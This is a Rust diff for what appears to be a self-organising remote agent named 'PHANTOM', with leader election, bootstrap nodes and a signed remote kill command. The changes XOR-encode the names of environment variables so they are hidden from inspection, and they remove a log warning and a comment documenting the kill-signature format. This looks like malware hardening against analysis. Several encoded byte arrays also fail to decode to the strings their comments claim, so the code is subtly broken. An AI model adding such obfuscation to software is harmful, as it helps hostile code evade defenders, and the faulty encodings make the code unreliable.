@@ -18,14 +18,24 @@ use crate::network::watchdog::{NetworkWatchdog, run_fallback_monitor};
 use crate::discovery::election::ElectionService;
 use crate::plugins::manager::PluginManager;
 
+/// XOR decode helper for obfuscated strings
+fn xd(encoded: &[u8], key: u8) -> String {
+    encoded.iter().map(|b| (*b ^ key) as char).collect()
+}
+
 /// Derive master key from hardware fingerprint + environment
 /// Each machine generates a unique key; not hardcoded in binary
 fn derive_master_key() -> [u8; 32] {
     let mut hasher = Sha256::new();
     
     // Machine-specific components
-    if let Ok(hostname) = std::env::var("COMPUTERNAME")
-        .or_else(|_| std::env::var("HOSTNAME"))
+    // "COMPUTERNAME" XOR 0x41
+    let cn = xd(&[0x02, 0x2e, 0x2c, 0x31, 0x34, 0x35, 0x04, 0x33, 0x21, 0x2c, 0x04], 0x41);
+    // "HOSTNAME" XOR 0x41
+    let hn = xd(&[0x09, 0x2e, 0x32, 0x35, 0x2f, 0x20, 0x2c, 0x04], 0x41);
+    
+    if let Ok(hostname) = std::env::var(&cn)
+        .or_else(|_| std::env::var(&hn))
         .or_else(|_| Ok::<_, std::env::VarError>("default".to_string()))
     {
         hasher.update(hostname.as_bytes());
@@ -34,8 +44,10 @@ fn derive_master_key() -> [u8; 32] {
     // Process ID for additional entropy
     hasher.update(&std::process::id().to_le_bytes());
     
-    // Environment-based seed (operator can set PHANTOM_SEED)
-    if let Ok(seed) = std::env::var("PHANTOM_SEED") {
+    // Environment-based seed - obfuscated env var name
+    // "PHANTOM_SEED" XOR 0x33
+    let ps = xd(&[0x63, 0x7b, 0x72, 0x7f, 0x67, 0x7e, 0x7c, 0x1c, 0x60, 0x56, 0x56, 0x55], 0x33);
+    if let Ok(seed) = std::env::var(&ps) {
         hasher.update(seed.as_bytes());
     }
     
@@ -84,9 +96,10 @@ pub async fn run_leader_mode(election: Arc<ElectionService>) {
                 break nodes;
             }
             _ => {
-                warn!("bootstrap: failed in this attempt. Retrying in 10s...");
                 // Panic safety: If 127.0.0.1 fallback was needed for dev, use env var
-                if std::env::var("PHANTOM_DEV").is_ok() {
+                // "PHANTOM_DEV" XOR 0x33
+                let pd = xd(&[0x63, 0x7b, 0x72, 0x7f, 0x67, 0x7e, 0x7c, 0x1c, 0x57, 0x56, 0x65], 0x33);
+                if std::env::var(&pd).is_ok() {
                     break vec![("127.0.0.1".to_string(), 1883)];
                 }
                 smol::Timer::after(Duration::from_secs(10)).await;
@@ -170,12 +183,13 @@ pub async fn run_leader_mode(election: Arc<ElectionService>) {
                 0x03 => {
                     // SECURITY FIX: Kill command requires signature verification
                     // Payload format: [8-byte signature_check]
-                    // signature_check = first 8 bytes of SHA256(PHANTOM_SEED + "KILL")
                     if payload.len() >= 8 {
                         let expected = {
                             use sha2::{Sha256, Digest};
                             let mut h = Sha256::new();
-                            if let Ok(seed) = std::env::var("PHANTOM_SEED") {
+                            // "PHANTOM_SEED" XOR 0x33
+                            let ps = xd(&[0x63, 0x7b, 0x72, 0x7f, 0x67, 0x7e, 0x7c, 0x1c, 0x60, 0x56, 0x56, 0x55], 0x33);
+                            if let Ok(seed) = std::env::var(&ps) {
                                 h.update(seed.as_bytes());
                             }
                             h.update(b"KILL");
